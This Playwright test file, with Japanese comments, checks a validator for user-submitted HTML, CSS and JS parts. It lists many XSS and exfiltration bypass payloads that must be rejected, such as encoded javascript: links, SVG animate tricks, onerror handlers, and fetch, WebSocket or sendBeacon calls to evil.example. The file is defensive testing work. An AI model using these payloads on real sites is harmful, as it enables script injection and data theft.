// 投稿の検査（docs/tasks/T021.md「2」、SEC001 A02）。すり抜けの形を並べて、落ちることを確かめる。
import { expect, test } from '@playwright/test';
import { REJECT_CODES, SUBTYPES, checkPartCss, checkPartHtml, checkPartJs, checkSubmission, reviewFlags, workShape } from '../src/submission.ts';
import { CATEGORIES } from '../src/rules.ts';

const ID = 'card-x';
const ROOT = `[data-ld-part="${ID}"]`;
const html = (inner: string) => `<div data-ld-part="${ID}">${inner}</div>`;
const messages = (list: { message: string }[]) => list.map((p) => p.message);

test.describe('part.html', () => {
  test('ふつうの部品は通る', () => {
    expect(checkPartHtml(html('<button type="button" class="b" aria-pressed="false">押す</button><svg viewBox="0 0 1 1"><title>丸</title><use href="#a"/></svg><img alt="" src="data:image/png;base64,AAAA"><a href="#">リンク</a><a href="mailto:a@example.com">メール</a>'), ID)).toEqual([]);
  });

  test('閉じ忘れの <p> や <li> はブラウザが直すので通す（デザイナーの HTML をそのまま置くため）', () => {
    expect(checkPartHtml(html('<ul><li>一<li>二</ul><p>文'), ID)).toEqual([]);
  });

  test('根の形：なし、違う id、2つ、外の文字、閉じていない', () => {
    expect(messages(checkPartHtml('', ID))).toContain('part.html に要素がない');
    expect(messages(checkPartHtml('<div>a</div>', ID)).join()).toContain('data-ld-part がない');
    expect(messages(checkPartHtml('<div data-ld-part="other">a</div>', ID)).join()).toContain('"other"');
    expect(messages(checkPartHtml(`${html('a')}<div></div>`, ID)).join()).toContain('一番外');
    expect(messages(checkPartHtml(`${html('a')}外の文字`, ID)).join()).toContain('一番外');
    expect(messages(checkPartHtml(`<div data-ld-part="${ID}"><span>a</span>`, ID)).join()).toContain('閉じていない');
  });

  for (const [name, inner] of [
    ['イベント属性', '<input onfocus="x()">'],
    ['大文字のイベント属性', '<input ONFOCUS="x()">'],
    ['/ で区切ったイベント属性（正規表現では見えない形）', '<img/src="data:image/png;base64,AA"/onerror=x()>'],
    ['引用符のない属性の中のイベント属性', '<a href=# onclick=x()>a</a>'],
    ['SVG のイベント属性', '<svg><circle onbegin="x()"/></svg>'],
    ['SVG の animate で href を書き換える', '<svg><a><animate attributeName="href" values="javascript:x()"/><text>a</text></a></svg>'],
    ['SVG の set でイベント属性を足す', '<svg><set attributeName="onmouseover" to="x()"/></svg>'],
    ['<script>', '<script>x()</script>'],
    ['SVG の中の <script>', '<svg><script>x()</script></svg>'],
    ['<style>', '<style>a{}</style>'],
    ['<iframe>', '<iframe src="https://evil.example"></iframe>'],
    ['srcdoc の <iframe>', '<iframe srcdoc="<script>x()</script>"></iframe>'],
    ['<object>', '<object data="https://evil.example/x"></object>'],
    ['<embed>', '<embed src="https://evil.example/x">'],
    ['<base>', '<base href="https://evil.example/">'],
    ['<link>', '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ['<meta http-equiv>', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ['<template>', '<template><img src=x onerror=x()></template>'],
    ['枠の <template> を閉じる', '</template><script>x()</script>'],
    ['<noscript>', '<noscript><img src=x onerror=x()></noscript>'],
    ['<plaintext>', '<plaintext>'],
    ['外の画像', '<img src="https://evil.example/x.png">'],
    ['// の画像', '<img src="//evil.example/x.png">'],
    ['\\ で隠した画像', '<img src="\\\\evil.example\\x.png">'],
    ['srcset', '<img srcset="https://evil.example/x.png 1x">'],
    ['video の poster', '<video poster="https://evil.example/x.png"></video>'],
    ['audio の src', '<audio src="https://evil.example/x.mp3"></audio>'],
    ['source の src', '<video><source src="https://evil.example/x.mp4"></video>'],
    ['input の画像', '<input type="image" src="https://evil.example/x.png">'],
    ['SVG の image', '<svg><image href="https://evil.example/x.png"/></svg>'],
    ['SVG の use', '<svg><use href="https://evil.example/x.svg#a"/></svg>'],
    ['xlink:href の use', '<svg><use xlink:href="https://evil.example/x.svg#a"/></svg>'],
    ['外へのリンク', '<a href="https://evil.example">a</a>'],
    ['文字参照で隠したリンク', '<a href="&#106;avascript:x()">a</a>'],
    ['16進の文字参照で隠したリンク', '<a href="jav&#x61;script:x()">a</a>'],
    ['タブで隠したリンク', '<a href="java&Tab;script:x()">a</a>'],
    ['SVG の外へのリンク', '<svg><a href="https://evil.example"><text>a</text></a></svg>'],
    ['ping', '<a href="#" ping="https://evil.example">a</a>'],
    ['form の送信先', '<form action="https://evil.example"><button>a</button></form>'],
    ['button の送信先', '<form><button formaction="https://evil.example">a</button></form>'],
    ['style 属性の url', '<div style="background:url(https://evil.example/x.png)"></div>'],
    ['style 属性のエスケープした url', '<div style="background:u\\72l(https://evil.example/x.png)"></div>'],
  ] as const) {
    test(`落ちる：${name}`, () => {
      expect(checkPartHtml(html(inner), ID), inner).not.toEqual([]);
    });
  }

  test('文字にならない文字参照でも投げない（SEC001 A05）', () => {
    expect(() => checkPartHtml(html('<a href="&#x110000;">a</a><a href="&#99999999999;">b</a>'), ID)).not.toThrow();
  });

  test('深い入れ子でもスタックを使い切らない', () => {
    const depth = 40_000;
    expect(() => checkPartHtml(html('<b>'.repeat(depth) + '</b>'.repeat(depth)), ID)).not.toThrow();
  });

  test('閉じていないコメントは、枠の後ろの HTML を飲み込むので断る', () => {
    expect(messages(checkPartHtml(`${html('a')}<!-- `, ID)).join()).toContain('閉じていない');
  });
});

test.describe('part.css', () => {
  const ok = `${ROOT} { color: red; } ${ROOT} .a:hover { background: url(data:image/png;base64,AA) } ${ROOT} .b { filter: url(#f) } @media (min-width: 1px) { ${ROOT} .c { margin: 0 } } @keyframes k { from { opacity: 0 } }`;
  test('トークンを使っていなくても、根の下で外へ通信しなければ通る', () => {
    expect(checkPartCss(ok, ID)).toEqual([]);
  });

  test('書体は Google Fonts だけ', () => {
    expect(checkPartCss(`@import url("https://fonts.googleapis.com/css2?family=Inter");${ROOT}{}`, ID)).toEqual([]);
    expect(checkPartCss(`@font-face { font-family: a; src: url(https://fonts.gstatic.com/a.woff2) } ${ROOT}{}`, ID)).toEqual([]);
    expect(checkPartCss(`@font-face { font-family: a; src: url(data:font/woff2;base64,AA) } ${ROOT}{}`, ID)).toEqual([]);
    expect(checkPartCss(`@import url("https://evil.example/x.css");${ROOT}{}`, ID)).not.toEqual([]);
    expect(checkPartCss(`@import "https://fonts.googleapis.com.evil.example/x";${ROOT}{}`, ID)).not.toEqual([]);
    expect(checkPartCss(`@font-face { font-family: a; src: url(https://evil.example/a.woff2) } ${ROOT}{}`, ID)).not.toEqual([]);
    // 書体の配信先は @font-face の中だけ。背景に使うと外への通信
    expect(checkPartCss(`${ROOT} { background: url(https://fonts.gstatic.com/a.png) }`, ID)).not.toEqual([]);
  });

  for (const [name, css] of [
    ['根の外のセレクタ', 'body { color: red }'],
    ['どれか1つが根の外', `${ROOT} .a, .b { color: red }`],
    ['根の兄弟', `${ROOT} ~ .a { color: red }`],
    ['根の隣', `${ROOT} + .a { color: red }`],
    ['入れ子で根の兄弟', `${ROOT} { & ~ .a { color: red } }`],
    ['@media の中の根の外', '@media print { body { color: red } }'],
    ['外の背景', `${ROOT} { background: url(https://evil.example/x.png) }`],
    ['引用符の外の背景', `${ROOT} { background: url("//evil.example/x.png") }`],
    ['エスケープした url', `${ROOT} { background: u\\72 l(https://evil.example/x.png) }`],
    ['image-set の文字', `${ROOT} { background: image-set("https://evil.example/x.png" 1x) }`],
    ['cursor', `${ROOT} { cursor: url(https://evil.example/x.cur), auto }`],
    ['閉じていない url', `${ROOT} { background: url(https://evil.example/x.png`],
    ['知らない @', `@namespace x url(https://evil.example); ${ROOT}{}`],
    ['読めない CSS', `${ROOT} { color: red`],
  ] as const) {
    test(`落ちる：${name}`, () => {
      expect(checkPartCss(css, ID), css).not.toEqual([]);
    });
  }
});

test.describe('part.js', () => {
  const mount = (body: string) => `export function mount(root) { ${body}; return () => {}; }`;
  test('ふつうの JS は通る。文字列とコメントの中の語は数えない', () => {
    expect(checkPartJs(mount("// fetch(url) はしない\nconst label = 'WebSocket と fetch'; root.textContent = label"))).toEqual([]);
    expect(checkPartJs(mount('root.dataset.n = menu.fetch'))).toEqual([]);
  });

  for (const [name, body] of [
    ['fetch', "fetch('https://evil.example')"],
    ['別名の fetch', 'const f = fetch; f(1)'],
    ['XMLHttpRequest', 'new XMLHttpRequest()'],
    ['WebSocket', "new WebSocket('wss://evil.example')"],
    ['EventSource', "new EventSource('https://evil.example')"],
    ['sendBeacon', "navigator.sendBeacon('https://evil.example')"],
    ['eval', "eval('1')"],
    ['Function', "Function('return 1')()"],
    ['constructor', "(()=>{}).constructor('return 1')()"],
    ['import()', "import('https://evil.example/x.js')"],
    ['Worker', "new Worker('x.js')"],
    ['window[…]', "window['fet' + 'ch'](1)"],
    ['globalThis[…]', "globalThis['fet' + 'ch'](1)"],
    ['cookie', 'root.textContent = document.cookie'],
    ['<script> を作る', "root.append(root.ownerDocument.createElement('script'))"],
    ['location へ代入', "location.href = 'https://evil.example'"],
    ['document を直に探す', "document.querySelector('a')"],
  ] as const) {
    test(`落ちる：${name}`, () => {
      expect(checkPartJs(mount(body)), body).not.toEqual([]);
    });
  }

  test('外の import 文は落ちる', () => {
    expect(checkPartJs("import x from 'https://evil.example/x.js';\nexport function mount(root) { return () => {}; }")).not.toEqual([]);
  });

  test('mount がなければ落ちる', () => {
    expect(messages(checkPartJs('const a = 1;')).join()).toContain('mount');
  });
});

test.describe('全体：必須と任意', () => {
  const css = `${ROOT} { color: #ff0000; border-radius: 3px; }`;
  test('トークンに合っていなくても必須は通る。合っていないところは任意に出る', () => {
    const { required, optional } = checkSubmission({ id: ID, type: 'component', tags: [], html: html('a'), css, js: null });
    expect(required).toEqual([]);
    expect(optional.length).toBeGreaterThan(0);
    expect(messages(optional).join()).toContain('--_');
  });

  test('10個のトークンに合っていれば、任意も空', () => {
    const tokens = `${ROOT} {
      --_bg: var(--ld-bg, #fff); --_surface: var(--ld-surface, #f4f4f5); --_fg: var(--ld-fg, #111); --_muted: var(--ld-muted, #555); --_accent: var(--ld-accent, #f60);
      --_radius: var(--ld-radius, 8px); --_font: var(--ld-font, system-ui); --_space: var(--ld-space, 8px); --_shadow: var(--ld-shadow, none); --_motion: var(--ld-motion, 150ms);
      color: var(--_fg);
    }`;
    expect(checkSubmission({ id: ID, type: 'component', tags: [], html: html('a'), css: tokens, js: null })).toEqual({ required: [], optional: [] });
  });

  test('大きすぎるファイルは必須で落ちる', () => {
    const { required } = checkSubmission({ id: ID, type: 'screen', tags: [], html: html('a'.repeat(300 * 1024)), css, js: null });
    expect(messages(required).join()).toContain('上限 256KB');
  });

  test('投げない：読めないものは必須に入る', () => {
    const deep = `${ROOT} { ${'.a {'.repeat(100_000)} }`;
    expect(() => checkSubmission({ id: ID, type: 'screen', tags: [], html: html('a'), css: deep, js: null })).not.toThrow();
  });

  test('問題には英語の文もある（必須）', () => {
    const { required } = checkSubmission({ id: ID, type: 'screen', tags: [], html: '<div>a</div>', css, js: null });
    expect(required[0].en?.message).toContain('data-ld-part');
  });
});

test.describe('種類', () => {
  test('どの category にも subtype があり、形はサーバーが決める', () => {
    for (const category of CATEGORIES) expect(SUBTYPES[category].length).toBeGreaterThan(0);
    expect(workShape('Components')).toEqual({ type: 'component', platform: null });
    expect(workShape('Mobile')).toEqual({ type: 'screen', platform: 'mobile' });
    expect(workShape('Web')).toEqual({ type: 'screen', platform: 'web' });
    expect(workShape('Dashboard')).toEqual({ type: 'screen', platform: 'web' });
    expect(REJECT_CODES).toContain('other');
  });
});

test.describe('審査の印', () => {
  test('文字列の中も探す。場所を返す', () => {
    const flags = reviewFlags({
      html: html('<input type="password"><a href="/account">a</a>'),
      css: `${ROOT} { position: fixed; }`,
      js: "export function mount(root) {\n  const u = 'fet' + 'ch'; postMessage(1); root.innerHTML = location.href;\n}",
    });
    const names = flags.map((flag) => flag.name);
    for (const name of ['postMessage', 'location', 'innerHTML', 'type=password', 'href="/…"', 'position: fixed']) expect(names).toContain(name);
    expect(flags.find((flag) => flag.name === 'postMessage')).toMatchObject({ file: 'part.js', line: 2 });
  });

  test('何もなければ空', () => {
    expect(reviewFlags({ html: html('a'), css: `${ROOT}{color:red}`, js: null })).toEqual([]);
  });
});
